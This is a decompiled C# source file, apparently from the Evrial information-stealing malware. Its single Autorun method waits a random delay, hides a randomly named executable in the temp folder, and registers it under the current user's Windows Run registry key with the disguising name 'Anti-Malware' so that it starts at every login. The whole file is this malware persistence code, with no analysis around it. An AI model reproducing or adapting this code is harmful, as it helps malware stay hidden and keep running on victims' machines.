using System;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace Evrial.Hardware
{
	// Token: 0x0200001A RID: 26
	internal static class Run
	{
		// Token: 0x06000042 RID: 66 RVA: 0x00004120 File Offset: 0x00002320
		public static void Autorun()
		{
			Thread.Sleep(new Random().Next(1000, 2000));
			string path = Path.GetTempPath() + "\\nATNNhZ.exe";
			try
			{
				if (File.Exists(path))
				{
					try
					{
						File.SetAttributes(path, FileAttributes.Normal);
						File.Delete(path);
					}
					catch
					{
					}
				}
				if (!File.Exists(path))
				{
					try
					{
						File.SetAttributes(path, FileAttributes.Hidden);
					}
					catch
					{
					}
				}
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
				{
					registryKey.SetValue("Anti-Malware", Path.GetTempPath() + "\\nATNNhZ.exe");
				}
			}
			catch
			{
			}
		}
	}
}
